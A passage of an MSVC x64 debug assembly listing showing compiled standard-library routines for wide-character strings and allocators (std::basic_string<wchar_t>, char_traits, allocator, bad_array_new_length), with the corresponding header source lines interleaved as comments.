??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty, COMDAT

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b bd e0 00
	00 00		 mov	 rdi, QWORD PTR this$[rbp]
  0002d	33 c0		 xor	 eax, eax
  0002f	b9 10 00 00 00	 mov	 ecx, 16
  00034	f3 aa		 rep stosb
  00036	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0003d	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00044	5f		 pop	 rdi
  00045	5d		 pop	 rbp
  00046	c3		 ret	 0
??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >, COMDAT

; 2212 :     _CONSTEXPR20 _String_val() noexcept : _Bx() {}

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b c8	 mov	 rcx, rax
  00029	e8 00 00 00 00	 call	 ??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty

; 2213 : 
; 2214 :     // length of internal buffer, [1, 16] (NB: used by the debugger visualizer)
; 2215 :     static constexpr size_type _BUF_SIZE = 16 / sizeof(value_type) < 1 ? 1 : 16 / sizeof(value_type);
; 2216 :     // roundup mask for allocated buffers, [0, 15]
; 2217 :     static constexpr size_type _Alloc_mask = sizeof(value_type) <= 1 ? 15
; 2218 :                                            : sizeof(value_type) <= 2 ? 7
; 2219 :                                            : sizeof(value_type) <= 4 ? 3
; 2220 :                                            : sizeof(value_type) <= 8 ? 1
; 2221 :                                                                      : 0;
; 2222 :     // capacity in small mode
; 2223 :     static constexpr size_type _Small_string_capacity = _BUF_SIZE - 1;
; 2224 : 
; 2225 :     _NODISCARD _CONSTEXPR20 value_type* _Myptr() noexcept {
; 2226 :         value_type* _Result = _Bx._Buf;
; 2227 :         if (_Large_mode_engaged()) {
; 2228 :             _Result = _Unfancy(_Bx._Ptr);
; 2229 :         }
; 2230 : 
; 2231 :         return _Result;
; 2232 :     }
; 2233 : 
; 2234 :     _NODISCARD _CONSTEXPR20 const value_type* _Myptr() const noexcept {
; 2235 :         const value_type* _Result = _Bx._Buf;
; 2236 :         if (_Large_mode_engaged()) {
; 2237 :             _Result = _Unfancy(_Bx._Ptr);
; 2238 :         }
; 2239 : 
; 2240 :         return _Result;
; 2241 :     }
; 2242 : 
; 2243 :     _NODISCARD _CONSTEXPR20 bool _Large_mode_engaged() const noexcept {
; 2244 :         return _Myres > _Small_string_capacity;
; 2245 :     }
; 2246 : 
; 2247 :     _CONSTEXPR20 void _Activate_SSO_buffer() noexcept {
; 2248 :         // start the lifetime of the array elements
; 2249 : #if _HAS_CXX20
; 2250 :         if (_STD is_constant_evaluated()) {
; 2251 :             for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2252 :                 _Bx._Buf[_Idx] = value_type();
; 2253 :             }
; 2254 :         }
; 2255 : #endif // _HAS_CXX20
; 2256 :     }
; 2257 : 
; 2258 :     _CONSTEXPR20 void _Check_offset(const size_type _Off) const {
; 2259 :         // checks whether _Off is in the bounds of [0, size()]
; 2260 :         if (_Mysize < _Off) {
; 2261 :             _Xran();
; 2262 :         }
; 2263 :     }
; 2264 : 
; 2265 :     _CONSTEXPR20 void _Check_offset_exclusive(const size_type _Off) const {
; 2266 :         // checks whether _Off is in the bounds of [0, size())
; 2267 :         if (_Mysize <= _Off) {
; 2268 :             _Xran();
; 2269 :         }
; 2270 :     }
; 2271 : 
; 2272 :     [[noreturn]] static void _Xran() {
; 2273 :         _Xout_of_range("invalid string position");
; 2274 :     }
; 2275 : 
; 2276 :     _NODISCARD _CONSTEXPR20 size_type _Clamp_suffix_size(const size_type _Off, const size_type _Size) const noexcept {
; 2277 :         // trims _Size to the longest it can be assuming a string at/after _Off
; 2278 :         return (_STD min)(_Size, _Mysize - _Off);
; 2279 :     }
; 2280 : 
; 2281 :     union _Bxty { // storage for small buffer or pointer to larger one
; 2282 :         // This constructor previously initialized _Ptr. Don't rely on the new behavior without
; 2283 :         // renaming `_String_val` (and fixing the visualizer).
; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers
; 2285 :         _CONSTEXPR20 ~_Bxty() noexcept {} // user-provided, for fancy pointers
; 2286 : 
; 2287 :         value_type _Buf[_BUF_SIZE];
; 2288 :         pointer _Ptr;
; 2289 :         char _Alias[_BUF_SIZE]; // TRANSITION, ABI: _Alias is preserved for binary compatibility (especially /clr)
; 2290 : 
; 2291 :         _CONSTEXPR20 void _Switch_to_buf() noexcept {
; 2292 :             _STD _Destroy_in_place(_Ptr);
; 2293 : 
; 2294 : #if _HAS_CXX20
; 2295 :             // start the lifetime of the array elements
; 2296 :             if (_STD is_constant_evaluated()) {
; 2297 :                 for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2298 :                     _Buf[_Idx] = value_type();
; 2299 :                 }
; 2300 :             }
; 2301 : #endif // _HAS_CXX20
; 2302 :         }
; 2303 :     };
; 2304 :     _Bxty _Bx;
; 2305 : 
; 2306 :     // invariant: _Myres >= _Mysize, and _Myres >= _Small_string_capacity (after string's construction)
; 2307 :     // neither _Mysize nor _Myres takes account of the extra null terminator
; 2308 :     size_type _Mysize = 0; // current length of string (size)

  0002e	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00035	48 c7 40 10 00
	00 00 00	 mov	 QWORD PTR [rax+16], 0

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

  0003d	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00044	48 c7 40 18 00
	00 00 00	 mov	 QWORD PTR [rax+24], 0

; 2212 :     _CONSTEXPR20 _String_val() noexcept : _Bx() {}

  0004c	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00053	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0005a	5f		 pop	 rdi
  0005b	5d		 pop	 rbp
  0005c	c3		 ret	 0
??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z
_TEXT	SEGMENT
__formal$ = 224
?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z PROC ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size, COMDAT

; 740  :     _NODISCARD static _CONSTEXPR20 size_type max_size(const _Alloc&) noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 741  :         return static_cast<size_t>(-1) / sizeof(value_type);

  0001f	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH

; 742  :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ENDP ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z
_TEXT	SEGMENT
this$ = 224
_Count$ = 232
?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z PROC	; std::allocator<wchar_t>::allocate, COMDAT

; 980  :     _NODISCARD_RAW_PTR_ALLOC _CONSTEXPR20 __declspec(allocator) _Ty* allocate(_CRT_GUARDOVERFLOW const size_t _Count) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 981  :         static_assert(sizeof(value_type) > 0, "value_type must be complete before calling allocate.");
; 982  :         return static_cast<_Ty*>(_Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));

  00024	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  0002b	e8 00 00 00 00	 call	 ??$_Get_size_of_n@$01@std@@YA_K_K@Z ; std::_Get_size_of_n<2>
  00030	48 8b c8	 mov	 rcx, rax
  00033	e8 00 00 00 00	 call	 ??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z ; std::_Allocate<16,std::_Default_allocate_traits,0>

; 983  :     }

  00038	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0003f	5f		 pop	 rdi
  00040	5d		 pop	 rbp
  00041	c3		 ret	 0
?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z ENDP	; std::allocator<wchar_t>::allocate
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??0?$allocator@_W@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0?$allocator@_W@std@@QEAA@XZ PROC			; std::allocator<wchar_t>::allocator<wchar_t>, COMDAT

; 966  :     constexpr allocator() noexcept {}

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
??0?$allocator@_W@std@@QEAA@XZ ENDP			; std::allocator<wchar_t>::allocator<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Xlen_string@std@@YAXXZ
_TEXT	SEGMENT
?_Xlen_string@std@@YAXXZ PROC				; std::_Xlen_string, COMDAT

; 2326 : [[noreturn]] inline void _Xlen_string() {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2327 :     _Xlength_error("string too long");

  0001b	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_C@_0BA@JFNIOLAK@string?5too?5long@
  00022	e8 00 00 00 00	 call	 ?_Xlength_error@std@@YAXPEBD@Z ; std::_Xlength_error
$LN2@Xlen_strin:

; 2328 : }

  00027	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002e	5f		 pop	 rdi
  0002f	5d		 pop	 rbp
  00030	c3		 ret	 0
?_Xlen_string@std@@YAXXZ ENDP				; std::_Xlen_string
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z
_TEXT	SEGMENT
_Left$ = 224
_Right$ = 232
?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z PROC	; std::_WChar_traits<wchar_t>::assign, COMDAT

; 294  :     static _CONSTEXPR17 void assign(_Elem& _Left, const _Elem& _Right) noexcept {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 295  : #if _HAS_CXX20
; 296  :         if (_STD is_constant_evaluated()) {
; 297  :             return _Primary_char_traits::assign(_Left, _Right);
; 298  :         }
; 299  : #endif // _HAS_CXX20
; 300  :         _Left = _Right;

  00024	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _Left$[rbp]
  0002b	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  00032	0f b7 09	 movzx	 ecx, WORD PTR [rcx]
  00035	66 89 08	 mov	 WORD PTR [rax], cx

; 301  :     }

  00038	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0003f	5f		 pop	 rdi
  00040	5d		 pop	 rbp
  00041	c3		 ret	 0
?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ENDP	; std::_WChar_traits<wchar_t>::assign
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z
_TEXT	SEGMENT
_First$ = 224
?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z PROC	; std::_WChar_traits<wchar_t>::length, COMDAT

; 255  :     _NODISCARD static _CONSTEXPR17 size_t length(_In_z_ const _Elem* _First) noexcept /* strengthened */ {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 256  :         // find length of null-terminated sequence
; 257  : #if _HAS_CXX17
; 258  :         if constexpr (is_same_v<_Elem, wchar_t>) {
; 259  :             return __builtin_wcslen(_First);
; 260  :         } else {
; 261  :             return _Primary_char_traits::length(_First);
; 262  :         }
; 263  : #else // ^^^ _HAS_CXX17 / !_HAS_CXX17 vvv
; 264  :         return _CSTD wcslen(reinterpret_cast<const wchar_t*>(_First));

  0001f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _First$[rbp]
  00026	e8 00 00 00 00	 call	 wcslen

; 265  : #endif // ^^^ !_HAS_CXX17 ^^^
; 266  :     }

  0002b	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00032	5f		 pop	 rdi
  00033	5d		 pop	 rbp
  00034	c3		 ret	 0
?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z ENDP	; std::_WChar_traits<wchar_t>::length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
_TEXT	SEGMENT
_First1$ = 224
_First2$ = 232
_Count$ = 240
?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z PROC ; std::_Char_traits<wchar_t,unsigned short>::copy, COMDAT

; 48   :         _In_reads_(_Count) const _Elem* const _First2, const size_t _Count) noexcept /* strengthened */ {

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 49   :         // copy [_First2, _First2 + _Count) to [_First1, ...)
; 50   : #if _HAS_MEMCPY_MEMMOVE_INTRINSICS
; 51   :         __builtin_memcpy(_First1, _First2, _Count * sizeof(_Elem));
; 52   : #else // ^^^ _HAS_MEMCPY_MEMMOVE_INTRINSICS / !_HAS_MEMCPY_MEMMOVE_INTRINSICS vvv
; 53   : #if _HAS_CXX20
; 54   :         if (_STD is_constant_evaluated()) {
; 55   :             // pre: [_First1, _First1 + _Count) and [_First2, _First2 + _Count) do not overlap
; 56   :             for (size_t _Idx = 0; _Idx != _Count; ++_Idx) {
; 57   :                 _First1[_Idx] = _First2[_Idx];
; 58   :             }
; 59   : 
; 60   :             return _First1;
; 61   :         }
; 62   : #endif // _HAS_CXX20
; 63   : 
; 64   :         _CSTD memcpy(_First1, _First2, _Count * sizeof(_Elem));

  00029	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  00030	48 d1 e0	 shl	 rax, 1
  00033	4c 8b c0	 mov	 r8, rax
  00036	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _First2$[rbp]
  0003d	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _First1$[rbp]
  00044	e8 00 00 00 00	 call	 memcpy

; 65   : #endif // ^^^ !_HAS_MEMCPY_MEMMOVE_INTRINSICS ^^^
; 66   : 
; 67   :         return _First1;

  00049	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _First1$[rbp]

; 68   :     }

  00050	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00057	5f		 pop	 rdi
  00058	5d		 pop	 rbp
  00059	c3		 ret	 0
?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ENDP ; std::_Char_traits<wchar_t,unsigned short>::copy
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ
_TEXT	SEGMENT
this$ = 224
?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ PROC	; std::_Fake_proxy_ptr_impl::_Release, COMDAT

; 1445 :     _CONSTEXPR20 void _Release() noexcept {}

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ ENDP	; std::_Fake_proxy_ptr_impl::_Release
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z
_TEXT	SEGMENT
this$ = 224
__formal$ = 232
__formal$ = 240
??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z PROC ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl, COMDAT

; 1442 :     _CONSTEXPR20 _Fake_proxy_ptr_impl(const _Fake_allocator&, const _Container_base0&) noexcept {}

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00029	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00030	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00037	5f		 pop	 rdi
  00038	5d		 pop	 rbp
  00039	c3		 ret	 0
??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ENDP ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z
_TEXT	SEGMENT
_Bytes$ = 224
?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z PROC ; std::_Default_allocate_traits::_Allocate, COMDAT

; 89   :         void* _Allocate(const size_t _Bytes) {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 90   :         return ::operator new(_Bytes);

  0001f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Bytes$[rbp]
  00026	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new

; 91   :     }

  0002b	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00032	5f		 pop	 rdi
  00033	5d		 pop	 rbp
  00034	c3		 ret	 0
?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ENDP ; std::_Default_allocate_traits::_Allocate
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Throw_bad_array_new_length@std@@YAXXZ
_TEXT	SEGMENT
$T1 = 200
?_Throw_bad_array_new_length@std@@YAXXZ PROC		; std::_Throw_bad_array_new_length, COMDAT

; 63   : [[noreturn]] inline void _Throw_bad_array_new_length() {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec 18 01
	00 00		 sub	 rsp, 280		; 00000118H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 64   :     _THROW(bad_array_new_length{});

  0001b	48 8d 8d c8 00
	00 00		 lea	 rcx, QWORD PTR $T1[rbp]
  00022	e8 00 00 00 00	 call	 ??0bad_array_new_length@std@@QEAA@XZ ; std::bad_array_new_length::bad_array_new_length
  00027	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:_TI3?AVbad_array_new_length@std@@
  0002e	48 8d 8d c8 00
	00 00		 lea	 rcx, QWORD PTR $T1[rbp]
  00035	e8 00 00 00 00	 call	 _CxxThrowException
$LN2@Throw_bad_:

; 65   : }

  0003a	48 8d a5 f8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+248]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?_Throw_bad_array_new_length@std@@YAXXZ ENDP		; std::_Throw_bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??_Gbad_array_new_length@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 224
__flags$ = 232
??_Gbad_array_new_length@std@@UEAAPEAXI@Z PROC		; std::bad_array_new_length::`scalar deleting destructor', COMDAT
$LN4:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001e	e8 00 00 00 00	 call	 ??1bad_array_new_length@std@@UEAA@XZ
  00023	8b 85 e8 00 00
	00		 mov	 eax, DWORD PTR __flags$[rbp]
  00029	83 e0 01	 and	 eax, 1
  0002c	85 c0		 test	 eax, eax
  0002e	74 11		 je	 SHORT $LN2@scalar
  00030	ba 18 00 00 00	 mov	 edx, 24
  00035	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0003c	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN2@scalar:
